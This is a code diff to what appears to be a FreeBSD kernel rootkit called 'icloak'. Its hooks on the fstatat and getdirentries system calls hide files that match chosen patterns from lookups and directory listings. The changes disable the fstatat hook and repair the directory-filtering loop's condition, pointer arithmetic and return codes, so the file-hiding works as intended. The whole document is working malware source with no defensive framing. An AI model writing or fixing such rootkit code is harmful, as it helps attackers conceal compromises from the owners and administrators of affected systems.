@@ -133,9 +133,9 @@ int native_hide_file(const char *pattern) {
         return 1;
     }
 
-    if (fstatat_syscall == NULL) {
-        kook(SYS_fstatat, icloak_fstatat, (void **)&fstatat_syscall);
-    }
+    //if (fstatat_syscall == NULL) {
+    //    kook(SYS_fstatat, icloak_fstatat, (void **)&fstatat_syscall);
+    //}
 
     if (getdirentries_syscall == NULL) {
         kook(SYS_getdirentries, icloak_getdirentries, (void **)&getdirentries_syscall);
@@ -179,47 +179,51 @@ static int icloak_fstatat(struct thread *td, struct fstatat_args *args) {
     matches = icloak_match_filename(args->path, g_icloak_hidden_patterns);
 
     if (matches) {
-        td->td_retval[0] = -ENOENT;
-        return 0;
+        td->td_retval[0] = ENOENT;
+        return ENOENT;
     }
 
     return fstatat_syscall(td, args);
 }
 
 static int icloak_getdirentries(struct thread *td, struct getdirentries_args *args) {
-    int num, delta;
+    int total, num, delta;
     struct dirent *dirp;
     void *buf, *bp;
 
     getdirentries_syscall(td, args);
-    num = td->td_retval[0];
+    num = total = td->td_retval[0];
+
+    if (total <= 0) {
+        return ENOENT;
+    }
 
     buf = icloak_alloc(num);
 
     if (buf == NULL) {
-        return -EFAULT;
+        return EFAULT;
     }
 
     dirp = (struct dirent *)args->buf;
     delta = 0;
     bp = buf;
 
-    while (num < 0) {
+    while (num > 0) {
         if (icloak_match_filename(dirp->d_name, g_icloak_hidden_patterns)) {
             delta += dirp->d_reclen;
         } else {
             copyin(dirp, bp, dirp->d_reclen);
-            bp = (intptr_t *)bp + dirp->d_reclen;
+            bp = (unsigned char *)bp + dirp->d_reclen;
         }
 
         num -= dirp->d_reclen;
-        dirp = dirp + dirp->d_reclen;
+        dirp = (struct dirent *)((unsigned char *)dirp + dirp->d_reclen);
     }
 
     if (delta > 0) {
-        memset(args->buf, 0, td->td_retval[0]);
-        td->td_retval[0] -= delta;
-        copyout(buf, args->buf, td->td_retval[0]);
+        memset(args->buf, 0, total);
+        total -= delta;
+        copyout(buf, args->buf, total);
     }
 
     icloak_free(buf);
